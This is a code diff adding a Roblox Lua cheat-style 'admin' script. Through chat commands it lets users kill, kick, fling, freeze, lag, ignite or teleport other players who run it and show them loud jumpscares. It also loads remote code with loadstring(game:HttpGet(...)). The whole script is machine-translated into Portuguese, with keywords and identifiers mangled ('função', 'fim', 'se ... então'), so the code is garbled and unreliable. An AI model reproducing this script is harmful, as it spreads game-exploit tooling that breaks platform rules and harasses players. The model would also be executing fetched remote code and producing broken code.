+    local flashInterval = 0.1
+
+    som:Reproduzir()
+
+    UserInputService.MouseIconEnabled = false
+
+    tarefa.spawn(função()
+        para i = 1, flashCount faça
+            se não screenGui.Parent então interrompa o processo
+            imageLabel.ImageTransparency = (i % 2 == 0) e 0,1 ou 0
+            tarefa.esperar(intervalo de flash)
+        fim
+        
+        imageLabel.ImageTransparency = 0
+        tarefa.esperar(0.8)
+        
+        local fadeTween = TweenService:Create(imageLabel, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            Transparência da imagem = 1
         })
-    end
-end
+        fadeTween:Reproduzir()
+        
+        local bgFadeTween = TweenService:Create(mainFrame, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            BackgroundTransparency = 1
+        })
+        bgFadeTween:Reproduzir()
+        
+        tarefa.esperar(2)
+        
+        UserInputService.MouseIconEnabled = true
+        
+        screenGui:Destruir()
+    fim)
+
+    retornar verdadeiro
+fim
+
+função local TheRakeJumpscare()
+    local SoundService = game:GetService("SoundService")
+    local CoreGui = game:GetService("CoreGui")
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FullJumpscare"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.DisplayOrder = 999999
+    screenGui.Parent = CoreGui
+    
+    local imageLabel = Instance.new("ImageLabel")
+    imageLabel.Size = UDim2.new(1.2, 0, 1.2, 0)
+    imageLabel.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    imageLabel.BackgroundTransparency = 1
+    imageLabel.Image = "rbxassetid://108753859505348"
+    imageLabel.ZIndex = 999999
+    imageLabel.Parent = screenGui
+    
+    local sound1 = Instance.new("Som")
+    sound1.SoundId = "rbxassetid://18967004856"
+    som1.Volume = 10
+    sound1.Parent = SoundService
+    
+    local sound2 = Instance.new("Som")
+    sound2.SoundId = "rbxassetid://103396125105301"
+    som2.Volume = 10
+    sound2.Parent = SoundService
+    
+    local está tremendo = verdadeiro
+    
+    tarefa.spawn(função()
+        enquanto está tremendo
+            local offsetX = math.random(-10, 10)
+            deslocamento localY = math.random(-10, 10)
+            imageLabel.Position = UDim2.new(-0.1, offsetX, -0.1, offsetY)
+            tarefa.esperar(0.02)
+        fim
+    fim)
+    
+    imageLabel.Visible = true
+    som1:Reproduzir()
+    
+    tarefa.atraso(2, função()
+        som2:Reproduzir()
+        som2.Encerrado:Conectar(função()
+            está tremendo = falso
+            screenGui:Destruir()
+        fim)
+    fim)
+fim
+
+função local TeleportToBackrooms()
+    local backroomsModel = game:GetObjects("rbxassetid://10581711055")[1]
+    backroomsModel.Parent = espaço de trabalho
+    
+    para _, descendente em pares(backroomsModel:GetDescendants()) faça
+        se descendente:IsA("BasePart") então
+            descendente.Posição = descendente.Posição + Vector3.new(99999, 99999, 99999)
+        fim
+    fim
+    
+    jogador local = jogo.Jogadores.JogadorLocal
+    se player e player.Character e player.Character:FindFirstChild("HumanoidRootPart") então
+        local targetPosition = backroomsModel.PrimaryPart.Position
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition.X, targetPosition.Y + 90, targetPosition.Z)
+        tarefa.esperar(2)
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition.X, targetPosition.Y + 90, targetPosition.Z)
+    fim
+fim
+
+função local SitPlayer(targetPlayer)
+    Se não for targetPlayer ou não for targetPlayer.Character, retorne falso.
+    local humanoide = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+    se humanoide então
+        humanoide.Sente-se = verdadeiro
+        retornar verdadeiro
+    fim
+    retornar falso
+fim
+
+função local FirePlayer(targetPlayer)
+    Se não for targetPlayer ou não for targetPlayer.Character, retorne falso.
+    local humanoide = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+    se humanoide então
+        local fire = Instance.new("Fire")
+        fire.Parent = targetPlayer.Character:FindFirstChild("HumanoidRootPart") ou targetPlayer.Character:FindFirstChild("Torso") ou targetPlayer.Character:FindFirstChildWhichIsA("BasePart")
+        humanoide:ReceberDano(100)
+        retornar verdadeiro
+    fim
+    retornar falso
+fim
+
+verificação localEmAndamento = false
+
+função local ProcessarMensagem(msgText, authorName)
+    Se não for msgText ou não for authorName, retorne o fim.
+
+    comando localLower = msgText:lower()  
+    personagem local = JogadorLocal.Personagem  
+    humanoide local = caractere e caractere:FindFirstChildOfClass("Humanoid")  
+
+    se EImune(LocalPlayer.Name) então
+        retornar
+    fim
+
+    local targetLower = LocalPlayer.Name:lower()
+    
+    se comandoLower:match("/kill%s+" .. targetLower) então  
+        MatarJogador(JogadorLocal)
+    fim
+
+    se comandoLower:match("/kick%s+" .. targetLower) então  
+        motivo local = comandoLower:match("/kick%s+" .. targetLower .. "%s+(.+)")
+        ExpulsarJogador(JogadorLocal, motivo)
+    fim
+    
+    se comandoLower:match("/explode%s+" .. targetLower) então  
+        ExplodirPlayer(LocalPlayer)
+    fim
+
+    se comandoLower:match("/loopkill%s+" .. targetLower) então  
+        LoopKillPlayer(LocalPlayer)
+    fim
+
+    se comandoLower:match("/unloopkill%s+" .. targetLower) então  
+        UnloopKillPlayer(LocalPlayer)
+    fim
+
+    se comandoLower:match("/bring%s+" .. targetLower) então  
+        comandante local = Jogadores:EncontrarPrimeiroFilho(nomeDoAutor)
+        se comandante então
+            TrazerJogador(JogadorLocal, comandante)
+        fim
+    fim
+
+    se comandoLower:match("/loopbring%s+" .. targetLower) então  
+        comandante local = Jogadores:EncontrarPrimeiroFilho(nomeDoAutor)
+        se comandante então
+            LoopBringPlayer(LocalPlayer, comandante)
+        fim
+    fim
+
+    se comandoLower:match("/unloopbring%s+" .. targetLower) então  
+        UnloopBringPlayer(LocalPlayer)
+    fim
+
+    se comandoLower:match("/float%s+" .. targetLower) então  
+        FloatPlayer(LocalPlayer)
+    fim
+
+    se comandoLower:match("/lag%s+" .. targetLower) então  
+        LagPlayer(LocalPlayer)
+    fim
+
+    se comandoLower:match("/backrooms%s+" .. targetLower) então
+        TeletransportarParaOsFundos()
+    fim
+
+    se comandoLower:match("/fling%s+" .. targetLower) então  
+        se o caractere então  
+            raiz local = caractere:FindFirstChild("HumanoidRootPart")  
+            se for raiz então  
+                local tween = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0,100000,0)})  
+                tween:Reproduzir()  
+            fim  
+        fim  
+    fim  
+
+    se comandoLower:match("/freeze%s+" .. targetLower) então  
+        se humanoide então  
+            playerOriginalSpeed[LocalPlayer] = humanoid.WalkSpeed
+            humanoide.VelocidadeDeCaminhada = 0  
+        fim  
+    fim  
+
+    se comandoLower:match("/unfreeze%s+" .. targetLower) então  
+        se humanoide então  
+            humanoid.WalkSpeed ​​= playerOriginalSpeed[LocalPlayer] ou 16  
+        fim  
+    fim
+
+    se comandoLower:match("/jumps1%s+" .. targetLower) então  
+        CriarJumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
+    fim
+
+    se comandoLower:match("/jumps2%s+" .. targetLower) então  
+        CriarJumpscareLocal("rbxassetid://86379969987314", "rbxassetid://143942090")
+    fim
+
+    se comandoLower:match("/jumps3%s+" .. targetLower) então  
+        CriarJumpscareLocal("rbxassetid://127382022168206", "rbxassetid://143942090")
+    fim
+
+    se comandoLower:match("/jumps4%s+" .. targetLower) então  
+        CriarJumpscareLocal("rbxassetid://95973611964555", "rbxassetid://138873214826309")
+    fim
+
+    se comandoLower:match("/therakejumpscare%s+" .. targetLower) então  
+        TheRakeJumpscare()
+    fim
+
+    se comandoLower:match("/sit%s+" .. targetLower) então  
+        SitPlayer(LocalPlayer)
+    fim
+
+    se comandoLower:match("/fire%s+" .. targetLower) então  
+        FirePlayer(LocalPlayer)
+    fim
+
+    if comandoLower:match("^/verifique$") e não verificacaoEmAndamento então  
+        verificacaoEmAndamento = true
+        
+        se authorName ~= LocalPlayer.Name então
+            tarefa.esperar(1)
+            local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") ou TextChatService.TextChannels:GetChildren()[1]  
+            se for canal então  
+                local randomCode = tostring(math.random(1000, 9999))
+                canal:SendAsync("LCC_" .. randomCode)  
+            fim  
+        fim
+        
+        verificacaoEmAndamento = false
+    fim
+
+    se msgText:match("[Ll]cc_%d%d%d%d") então  
+        se não LCC_USERS[authorName] então
+            LCC_USERS[authorName] = true
+            AtualizarTagPorNome(authorName)
+        fim
+    fim
+fim
+
+função local ConectarCanal(canal)
+    Se não for canal ou não for canal.IsA, retorne ao fim.
+    se não canal:IsA("TextChannel") então retorne fim
+    canal.MessageReceived:Connect(function(msg)
+        texto local = msg.Texto
+        fonte local = msg.TextSource e msg.TextSource.Name
+        se texto e fonte então
+            ProcessarMensagem(texto, fonte)
+        fim
+    fim)
+fim
+
+para _, ch em pares(TextChatService.TextChannels:GetChildren()) faça
+    ConectarCanal(ch)
+fim
+
+TextChatService.TextChannels.ChildAdded:Connect(function(ch)
+    ConectarCanal(ch)
+fim)
+
+local ok, WindUI = pcall(function()
+    return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+fim)
+
+se estiver tudo bem e WindUI então
+    local playerName = LocalPlayer.Name
+    se TemCargo(playerName) ou LCC_USERS[playerName] então
+        
+WindUI:AdicionarTema({
+    Nome = "Tema Preto e Azul",
+    
+    Fundo = Color3.fromRGB(10, 10, 10),
+    WindowBackground = Color3.fromRGB(15, 15, 15),
+    DialogBackground = Color3.fromRGB(15, 15, 15),
+    TabBackground = Color3.fromRGB(20, 20, 20),
+    ElementoFundo = Cor3.fromRGB(25, 25, 25),
+    PopupBackground = Color3.fromRGB(20, 20, 20),
+    
+    Accent = Color3.fromRGB(0, 100, 200),
+    Contorno = Color3.fromRGB(40, 120, 220),
+    Texto = Color3.fromRGB(240, 245, 255),
+    Espaço reservado = Color3.fromRGB(160, 180, 200),
+    Botão = Color3.fromRGB(0, 90, 180),
+    Ícone = Color3.fromRGB(120, 180, 255),
+    
+    BackgroundTransparency = 0.05,
+    Hover = Color3.fromRGB(30, 80, 150),
+    SombraDaJanela = Cor3.fromRGB(0, 0, 0),
+    
+    TransparênciaDeFundoDoDialog = 0,05,
+    DialogTitle = Color3.fromRGB(220, 235, 255),
+    DialogContent = Color3.fromRGB(200, 215, 235),
+    DialogIcon = Color3.fromRGB(120, 180, 255),
+    
+    WindowTopbarButtonIcon = Color3.fromRGB(120, 180, 255),
+    WindowTopbarTitle = Color3.fromRGB(220, 235, 255),
+    WindowTopbarAuthor = Color3.fromRGB(180, 205, 235),
+    WindowTopbarIcon = Color3.fromRGB(120, 180, 255),
+    
+    TabTitle = Color3.fromRGB(220, 235, 255),
+    TabIcon = Color3.fromRGB(120, 180, 255),
+    
+    ElementTitle = Color3.fromRGB(220, 235, 255),
+    ElementDesc = Color3.fromRGB(180, 205, 235),
+    ElementIcon = Color3.fromRGB(120, 180, 255),
+    
+    Transparência de fundo da janela pop-up = 0,05,
+    PopupTitle = Color3.fromRGB(220, 235, 255),
+    PopupContent = Color3.fromRGB(200, 215, 235),
+    PopupIcon = Color3.fromRGB(120, 180, 255),
+    
+    DialogButton = Color3.fromRGB(0, 90, 180),
+    TextoDoBotãoDeDialog = Color3.fromRGB(240, 245, 255),
+    DialogButtonHover = Color3.fromRGB(30, 110, 200),
+    
+    PopupButton = Color3.fromRGB(0, 90, 180),
+    PopupButtonText = Color3.fromRGB(240, 245, 255),
+    PopupButtonHover = Color3.fromRGB(30, 110, 200)
+})
+
+WindUI:Gradiente({
+    ["0"] = { Cor = Color3.fromRGB(0, 30, 70), Transparência = 0.1 },
+    ["100"] = { Cor = Color3.fromRGB(15, 50, 100), Transparência = 0.3 },
+}, {
+    Rotação = 0,
+})
+
+WindUI:SetTheme("Tema PretoAzul")
+
+Jogadores locais = jogo:ObterServiço("Jogadores")
+local LocalPlayer = Players.LocalPlayer
+local userId = LocalPlayer.UserId
+
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size150x150
+conteúdo local, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+local Window = WindUI:CreateWindow({
+    Título = "Administrador Lcc",
+    Ícone = "escudo",
+    Autor = "Por Lcc/Eduarda",
+    Pasta = "MyLCCHub",
+    
+    Tamanho = UDim2.fromOffset(580, 460),
+    MinSize = Vector2.new(560, 350),
+    MaxSize = Vector2.new(850, 560),
+    Transparente = verdadeiro,
+    Tema = "Tema Preto e Azul",
+    Redimensionável = verdadeiro,
+    Largura da barra lateral = 200,
+    BackgroundImageTransparency = 0.15,
+    OcultarBarraDePesquisa = verdadeiro,
+    ScrollBarEnabled = false,
+    
+    Background = "rbxassetid://103815341746038",
+    
+    Usuário = {
+        Ativado = verdadeiro,
+        Anônimo = falso,
+        Título = LocalPlayer.Name,
+        Avatar = conteúdo,
+        Callback = função()
+            Janela:Diálogo({
+                Ícone = "usuário",
+                Título = "Perfil do Usuário",
+                Content = "Nome: " .. LocalPlayer.Name .. "\nID: " .. userId .. "\n\nCargo: " .. (TemCargo(playerName) e "Admin" ou "Usuário LCC"),
+                Botões = {
+                    {
+                        Título = "OK",
+                        Callback = função()
+                        fim,
+                    },
+                },
+            }):Mostrar()
+        fim,
+    },
+})
+
+Janela:DefinirAlternarTecla(Enum.KeyCode.H)
+Janela:AlternarTransparência(verdadeiro)
+Janela:IsRedimensionável(verdadeiro)
+
+Janela:EditarBotãoAbrir({
+    Título = "Administração da LCC",
+    Ícone = "escudo",
+    CornerRadius = UDim.new(0, 16),
+    Espessura do traço = 2,
+    Cor = ColorSequence.new(
+        Color3.fromRGB(0, 100, 200),
+        Color3.fromRGB(120, 180, 255)
+    ),
+    OnlyMobile = falso,
+    Ativado = verdadeiro,
+    Arrastável = verdadeiro,
+})
+
+        local lockedTarget = nulo
+        local selectedPlayerName = nil
+        local estáAtualizando = falso
+        local dropdownsToUpdate = {}
+
+        função local obterListaDeJogadores()
+            jogadores locais = {}
+            para _, jogador em ipairs(Jogadores:ObterJogadores()) faça
+                local playerName = player.Name
+                se jogador == JogadorLocal então
+                    playerName = playerName .. "(Você)"
+                fim
+                tabela.inserir(jogadores, nomeDoJogador)
+            fim
+            tabela.ordenar(jogadores)
+            jogadores que retornam
+        fim
+
+        função local setupDropdownAutoUpdate()
+            função local atualizarTodosOsDropdowns()
+                Se estiver atualizando, retorne o fim.
+                estáAtualizando = verdadeiro
+                
+                sucesso local, listaDeJogadores = pcall(função()
+                    retornar getPlayersList()
+                fim)
+                
+                se sucesso e playerList então
+                    para _, lista suspensa em ipairs(listasSuspensasAtualizadas) faça
+                        se dropdown e dropdown.SetValues ​​então
+                            pcall(função()
+                                lista suspensa:DefinirValores(listaDeJogadores)
+                            fim)
+                        fim
+                    fim
+                fim
+                
+                estáAtualizando = falso
+            fim
+            
+            local updateLoop = task.spawn(function()
+                enquanto verdadeiro faz
+                    atualizarTodosOsDropdowns()
+                    tarefa.esperar(30)
+                fim
+            fim)
+            
+            Jogadores.JogadorAdicionado:Conectar(função(jogador)
+                tarefa.esperar(0.5)
+                atualizarTodosOsDropdowns()
+            fim)
+            
+            Jogadores.RemovendoJogador:Conectar(função(jogador)
+                atualizarTodosOsDropdowns()
+            fim)
+            
+            retornar atualizarTodosOsDropdowns
+        fim
+
+        local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })  
+        local Section = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })  
+
+        nome do alvo local  
+        local Dropdown = Section:Dropdown({  
+            Título = "Selecionar Jogador",  
+            Valores = getPlayersList(),  
+            Valor = "",  
+            Callback = função(opcional)
+                se optar por então
+                    Se estiver atualizando, retorne o fim.
+                    
+                    se opt e opt ~= "" então
+                        bloqueadoTarget = opt:gsub(" %(Você%)", "")
+                        selectPlayerName = opt:gsub(" %(Você%)", "")
+                        TargetName = opt:gsub(" %(Você%)", "")
+                    outro
+                        lockedTarget = nulo
+                        selectedPlayerName = nulo
+                        TargetName = nulo
+                    fim
+                fim
+            fim  
+        })  
+
+        tabela.inserir(dropdownsToUpdate, Dropdown)
+
+        local TabJumpscare = Window:Tab({ Title = "Jumpscare", Icon = "skull", Locked = false })
+        local SectionJumpscare = TabJumpscare:Section({ Title = "Sustos Repentinos de Terror", Icon = "fantasma", Opened = true })
+
+        local JumpscareTargetName
+        local JumpscareDropdown = SectionJumpscare:Dropdown({  
+            Título = "Selecionar Jogador",  
+            Valores = getPlayersList(),  
+            Valor = "",  
+            Callback = função(opcional)
+                se optar por então
+                    Se estiver atualizando, retorne o fim.
+                    
+                    se opt e opt ~= "" então
+                        JumpscareTargetName = opt:gsub(" %(Você%)", "")
+                    outro
+                        JumpscareTargetName = nulo
+                    fim
+                fim
+            fim  
+        })
+
+        tabela.inserir(dropdownsToUpdate, JumpscareDropdown)
+
+        Seção:Botão({
+            Título = "Atualizar Lista",
+            Callback = função()
+                local newPlayers = getPlayersList()
+                Lista suspensa:DefinirValores(novosJogadores)
+                JumpscareDropdown:SetValues(newPlayers)
+                
+                se selectedPlayerName então
+                    jogador localExiste = falso
+                    para _, nome em ipairs(novosJogadores) faça
+                        if nome:gsub(" %(Você%)", "") == selectedPlayerName then
+                            jogadorExiste = verdadeiro
+                            quebrar
+                        fim
+                    fim
+                    
+                    se o jogador não existir então
+                        lockedTarget = nulo
+                        selectedPlayerName = nulo
+                        TargetName = nulo
+                    fim
+                fim
+            fim
+        })
+
+        conexões locais = {}
+        
+        função local setupAutoUpdate()
+            para _, conn em ipairs(conexões) faça
+                conexão:Desconectar()
+            fim
+            
+            local conn1 = Players.PlayerAdded:Connect(function(player)
+                tarefa.esperar(0.5)
+                local newPlayers = getPlayersList()
+                Lista suspensa:DefinirValores(novosJogadores)
+                JumpscareDropdown:SetValues(newPlayers)
+            fim)
+            
+            local conn2 = Players.PlayerRemoving:Connect(function(player)
+                tarefa.esperar(0.5)
+                local newPlayers = getPlayersList()
+                Lista suspensa:DefinirValores(novosJogadores)
+                JumpscareDropdown:SetValues(newPlayers)
+                
+                Se player.Name == selectedPlayerName então
+                    lockedTarget = nulo
+                    selectedPlayerName = nulo
+                    TargetName = nulo
+                fim
+            fim)
+            
+            tabela.inserir(conexões, conn1)
+            tabela.inserir(conexões, conn2)
+        fim
+
+        setupAutoUpdate()
+
+        local updateDropdownsFunction = setupDropdownAutoUpdate()
+
+        tarefa.spawn(função()
+            tarefa.esperar(1)
+            listaDeJogadores local = obterListaDeJogadores()
+            Lista suspensa:DefinirValores(listaDeJogadores)
+            JumpscareDropdown:SetValues(playerList)
+        fim)
+
+        comandos locais = {
+            "matar", "chutar",
+            "arremesso", "bastidores", "congelar", "descongelar",
+            "explodir", "trazer", "flutuar", "atrasar",
+            "loopkill", "unloopkill", "loopbring", "unloopbring",
+            "sentar", "fogo", "ch"
+        }  
+        
+        para _, cmd em ipairs(comandos) faça  
+            Seção:Botão({  
+                Título = "/" .. cmd:lower(),  
+                Desc = "Comando: /"..cmd.." [jogador]",
+                Callback = função()  
+                    se TargetName e TargetName ~= "" então  
+                        local podeUsar = PodeUsarComando(LocalPlayer.Name, TargetName)
+                        se não podeUsar então
+                            retornar
+                        fim
+                        EnviarComando(cmd, TargetName)  
+                    fim
+                fim  
+            })  
+        fim
+
+        Seção:Espaço()
+        Seção:Botão({  
+            Título = "/verifique",  
+            Desc = "Comando: /verifique - Outros usuários Lcc enviam código",
+            Callback = função()  
+                localComando("verifique")
+            fim  
+        })
+
+        sustos locais = {
+            { name = "jumps1", desc = "Jumpscare 1 - Imagem assustadora" },
+            { name = "jumps2", desc = "Jumpscare 2 - Terror clássico" },
+            { name = "jumps3", desc = "Jumpscare 3 - Sustos intensos" },
+            { name = "jumps4", desc = "Jumpscare 4 - Horror máximo" },
+            { name = "therakejumpscare", desc = "O susto do Rake" }
+        }
+
+        para _, susto repentino em ipairs(sustos repentinos) faça
+            SeçãoJumpscare:Botão({  
+                Título = "/" .. jumpscare.name,
+                Desc = jumpscare.desc,
+                Callback = função()  
+                    se JumpscareTargetName e JumpscareTargetName ~= "" então  
+                        local podeUsar = PodeUsarComando(LocalPlayer.Name, JumpscareTargetName)
+                        se não podeUsar então
+                            retornar
+                        fim
+                        EnviarComando(jumpscare.name, JumpscareTargetName)  
+                    fim
+                fim  
+            })
+        fim
+    fim
+fim
+
+LCC_USERS[LocalPlayer.Name] = true
+
+som local = Instância.novo("Som")
+sound.SoundId = "rbxassetid://8486683243"
+Volume do som = 0,5
+som.ReproduzirAoRemover = verdadeiro
+som.Pai = Espaço de trabalho
+som:Destruir()
